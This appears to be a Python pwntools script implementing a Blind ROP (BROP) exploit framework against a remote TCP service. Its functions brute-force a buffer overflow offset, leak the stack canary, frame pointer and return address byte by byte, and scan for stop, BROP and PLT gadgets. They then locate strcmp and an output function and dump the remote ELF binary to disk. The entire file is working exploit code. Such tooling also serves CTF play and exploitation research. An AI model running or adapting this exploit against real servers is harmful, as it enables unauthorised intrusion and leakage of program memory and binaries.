from pwn import *

class BROP:
    """Main BROP exploitation class"""
    global stop
    stop: bool = False
    def __init__(self, host, port, expected, expected_stop, wait):
        self.r = None
        self.open = False
        self.expected = expected.encode()
        self.expected_stop = expected_stop.encode()
        self.wait = wait
        self.writefunc = "puts"
        # BROP DATA
        self.host = host
        self.port = port
        self.offset = 0
        self.canary = b""
        self.rip = b""
        self.base_addr = b""
        self.rbp = b""
        self.plt = b""
        self.brop = b""
        self.stop_gadget = b""
        self.strcmp = 0
        self.write = 0
        self.fd = 0
        self.elf = b""

    def try_exp(self, payload, expected, close: bool = True, reuse: bool = False, retry=False):
        global stop
        crash = True
        try:
            self.r = remote(self.host, self.port) if not reuse or not self.open else self.r
            self.open = True
            self.r.recvuntil({f"{self.wait}\n"})
            crash = False
            self.r.send(payload)
            content = self.r.recvuntil(expected, timeout=1)
            if close:
                self.r.close()
                self.open = False
            return content if content else b'\x00'
        except EOFError:
            self.r.close()
            self.open = False
            if crash:
                stop = True
        except pwnlib.exception.PwnlibException as e:
            stop = True
        except Exception as e:
            if not retry:
                return self.try_exp(payload, close, False, True)
            else:
                stop = True
        return 0

    def exec(self, rop: list, expected: bytes = None, close: bool = True, reuse: bool = False):
        if not expected:
            expected = self.expected_stop
        payload = b"A" * self.offset
        payload += self.canary
        payload += self.rbp if self.canary != b"" else b""
        payload += b"".join(rop)
        return self.try_exp(payload, expected, close, reuse)

    def get_overflow_len(self) -> int:
        i = 1
        while i < 1000 and not stop:
            payload = b"A" * i
            res = self.try_exp(payload, self.expected)
            if not res or self.expected not in res:
                self.offset = i - 1
                return self.offset
            i += 1

    def leak_stack(self, length=8):
        global stop
        stack = b""
        for i in range(length):
            for j in range(256):
                b = j.to_bytes(1, "big")
                res = self.exec([stack, b], self.expected)
                if res and self.expected in res:
                    stack = stack + b
                    break
                if j == 255:
                    stop = True
        return stack
        
    def leak_canary(self):
        self.canary = self.leak_stack()
        return self.canary
    
    def leak_rbp(self):
        self.rbp = self.leak_stack()
        return self.rbp

    def leak_rip(self):
        addr = u64(self.leak_stack())
        self.rip = p64(addr)
        self.base_addr = p64(addr - (addr % 0x1000))
        return self.rip
    
    def get_stop_gadget(self):
        assert self.base_addr != b""
        addr = u64(self.base_addr)
        while not stop:
            rop = [p64(addr)]
            res = self.exec(rop)
            if res and self.expected_stop in res:
                self.stop_gadget = p64(addr)
                return self.stop_gadget
            addr += 1
        
    def get_brop_gadget(self, expected=None):
        assert self.base_addr != b"", self.stop_gadget != b""
        addr = u64(self.base_addr)
        while not stop:
            if self.rbp:
                rop1 = [p64(addr),
                        self.rbp *2,
                        p64(0) * 4,
                        self.stop_gadget,
                        p64(0) * 10
                        ]
            else:
                rop1 = [p64(addr),
                        p64(0) * 6,
                        self.stop_gadget,
                        p64(0) * 10
                        ]
            res1 = self.exec(rop1)

            rop2 = [p64(addr),
                    p64(0) * 10
                    ]
            res2 = self.exec(rop2)

            if res1 and self.expected_stop in res1 and not res2:
                self.brop = p64(addr)
                return self.brop
            addr += 1
    
    def set_rdi(self, rop: list, value: bytes):
        assert self.brop != b""
        rop.append(p64(u64(self.brop) + 0x9))
        rop.append(value)

    def set_rsi(self, rop: list, value: bytes):
        assert self.brop != b""
        rop.append(p64(u64(self.brop) + 0x7))
        rop.append(value)
        rop.append(p64(0))
    
    def get_plt(self):
        assert self.base_addr != b"", self.stop_gadget != b""
        addr = u64(self.base_addr)
        while not stop:
            rop1 = [p64(addr),
                    self.stop_gadget,
                    p64(0) * 10]
            res1 = self.exec(rop1)

            rop2 = [p64(addr + 6),
                    self.stop_gadget,
                    p64(0) * 6]
            res2 = self.exec(rop2)

            if res1 and res2 and self.expected_stop in res1 and self.expected_stop in res2:
                self.plt = p64(addr)
                return self.plt
            addr += 16

    def set_plt_entry(self, rop: list, entry: int):
        assert self.plt != b""
        rop.append(p64(u64(self.plt) + 0xb))
        rop.append(p64(entry))

    def set_plt(self, rop: list, entry: int, arg1: bytes, arg2: bytes):
        self.set_rdi(rop, arg1)
        self.set_rsi(rop, arg2)
        self.set_plt_entry(rop, entry)

    def call_plt(self, entry: int, arg1: bytes, arg2: bytes):
        rop = list()
        self.set_plt(rop, entry, arg1, arg2)
        rop.append(self.stop_gadget)
        return self.exec(rop)
            
    def get_write(self):
        max_fd = 50
        good = p64(u64(self.rip))
        for entry in range(100):
            for fd in range(0, max_fd):
                rop = list()
                self.set_plt(rop,self.strcmp,good,p64(u64(self.rip)+1))
                self.set_plt(rop,entry,p64(fd), good)
                rop.append(self.stop_gadget)

                res = self.call_plt(entry, p64(fd), good)

                res2 = self.call_plt(entry, good, p64(0))

                res3 = self.exec(rop)

                if res and len(res) > 1 and self.expected_stop not in res[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = fd
                    self.writefunc = "printf"
                    return self.write
                elif res2 and len(res2) > 1 and self.expected_stop not in res2[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = 0
                    self.writefunc = "puts"
                    return self.write
                elif res3 and len(res3) > 1 and self.expected_stop not in res3[:len(self.expected_stop)]:
                    self.write = entry
                    self.fd = fd
                    self.writefunc = "write"
                    return self.write
    
    def call_write(self, arg: bytes):
        assert self.write != 0
        if self.writefunc == "write":
            rop = list()
            self.set_plt(rop, self.strcmp, self.rip, p64(u64(self.rip) + 1))
            self.set_plt(rop, self.write, p64(self.fd), arg)
            rop.append(self.stop_gadget)
            return self.exec(rop)
        elif self.writefunc == "puts":
            return self.call_plt(self.write, arg, p64(0))
        else:
            return self.call_plt(self.write,p64(self.fd), arg)

    def get_strcmp(self):
        bad1 = p64(300)
        bad2 = p64(500)
        good = self.rip
        for entry in range(100):
            find = True
            find = find and not self.call_plt(entry, good, bad2)
            find = find and not self.call_plt(entry, bad1, good)
            res = self.call_plt(entry, good, good)
            find = find and res and self.expected_stop in res

            if find:
                self.strcmp = entry
                return self.strcmp
                
    def get_elf_addr(self):
        assert self.base_addr != b""
        expected = b"ELF"
        for i in range(u64(self.base_addr), 0, -0x100):
            res = self.call_write(p64(i))
            if res and expected in res:
                self.elf = p64(i)
                return self.elf
            if stop:
                break

    def dump(self, size: int):
        if(self.elf == b""): self.get_elf_addr()
        assert self.elf != b""
        stop_addr = u64(self.elf) + size
        addr = u64(self.elf)
        leak = b""
        while addr < stop_addr:
            res = self.call_write(p64(addr))
            if res:
                if f"\n{self.expected_stop.decode()}".encode() in res:
                    res = res[:res.rfind(f"\n{self.expected_stop.decode()}".encode())]
                elif self.expected_stop in res:
                    res = res[:res.rfind(self.expected_stop)]
                res = res if res else b'\x00'
                leak += res
                addr += len(res) if res else 1
        return leak

    def get_size(self):
        head = self.dump(100)
        e_shoff = u64(head[40:48])
        e_shentsize = unpack(head[58:60], "all")
        e_shnum = unpack(head[60:62], "all")
        size = e_shoff + (e_shentsize * e_shnum)
        return size

    def dump_all(self, output_file: str = "dump.bin"):
        size = self.get_size()
        bin = self.dump(size)
        f = open(output_file, "wb")
        f.write(bin)
        f.close()